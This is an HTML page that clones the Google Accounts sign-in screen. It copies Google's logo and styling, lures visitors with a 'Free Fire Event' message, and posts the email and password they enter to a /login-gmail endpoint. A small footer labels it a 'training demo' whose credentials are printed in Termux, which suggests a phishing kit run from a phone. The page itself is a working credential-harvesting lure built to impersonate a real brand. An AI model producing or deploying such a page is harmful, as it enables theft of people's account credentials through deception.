<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Sign in - Google Accounts</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
body {
    background: #f0f4f9;
    color: #1f1f1f;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 16px;
}
.card {
    width: 100%;
    max-width: 450px;
    background: #ffffff;
    padding: 40px 40px 36px;
    border-radius: 28px;
    box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
    text-align: center;
}
.logo {
    width: 48px;
    height: 48px;
    margin-bottom: 16px;
}
h1 {
    font-size: 24px;
    font-weight: 400;
    margin-bottom: 8px;
    color: #1f1f1f;
}
p {
    font-size: 16px;
    color: #444746;
    margin-bottom: 32px;
}
.input-group {
    position: relative;
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 16px;
    border: 1px solid #74777f;
    border-radius: 4px;
    font-size: 16px;
    outline: none;
    background: transparent;
    color: #1f1f1f;
    transition: border-color 0.2s;
}
input:focus {
    border-color: #0b57d0;
    border-width: 2px;
    padding: 15px;
}
.btn-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 32px;
}
.create-account {
    color: #0b57d0;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
}
.next-btn {
    background: #0b57d0;
    color: white;
    border: none;
    border-radius: 20px;
    padding: 10px 24px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s;
}
.next-btn:hover {
    background: #0842a0;
}
.training-notice {
    position: fixed;
    bottom: 10px;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 11px;
    color: #8a8d91;
    background: rgba(255,255,255,0.9);
    padding: 6px;
}
</style>
</head>
<body>
<div class="card">
    <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path fill="#4285F4" d="M23.745 12.27c-.07-.7-.6-1.57-1.42-1.57H12v4.5h6.61c-.3 1.63-1.8 4.78-6.61 4.78-3.98 0-7.22-3.3-7.22-7.38s3.24-7.38 7.22-7.38c2.26 0 3.77.96 4.63 1.78l3.25-3.15C17.9 1.95 15.22 1 12 1 5.92 1 1 5.92 1 12s4.92 11 11 11c6.35 0 10.55-4.47 10.55-10.77 0-.32-.03-.64-.05-.95z"/>
        <path fill="#34A853" d="M3.28 7.42l3.69 2.71C7.87 7.78 9.77 6.2 12 6.2c2.26 0 3.77.96 4.63 1.78l3.25-3.15C17.9 1.95 15.22 1 12 1 8.24 1 5.01 3.09 3.28 7.42z"/>
        <path fill="#FBBC05" d="M12 23c3.08 0 5.68-1.02 7.57-2.77l-3.5-2.87c-1 .68-2.28 1.14-4.07 1.14-2.81 0-5.19-1.9-6.04-4.45L2.14 16.2C3.99 20.17 7.68 23 12 23z"/>
        <path fill="#EA4335" d="M22.695 11.32H12v4.5h6.61c-.26 1.41-1.09 2.61-2.34 3.42l3.5 2.87c2.05-1.89 3.39-4.68 3.39-8.19 0-.32-.03-.64-.05-.95-.07-.7-.6-1.57-1.42-1.57z"/>
    </svg>
    <h1>Sign in</h1>
    <p>to continue to Free Fire Event</p>
    <form action="/login-gmail" method="POST">
        <div class="input-group">
            <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
        </div>
        <div class="input-group">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        </div>
        <div class="btn-container">
            <a href="#" class="create-account">Create account</a>
            <button type="submit" class="next-btn">Next</button>
        </div>
    </form>
</div>
<div class="training-notice">TRAINING DEMO • Credentials only printed in Termux</div>
</body>
</html>
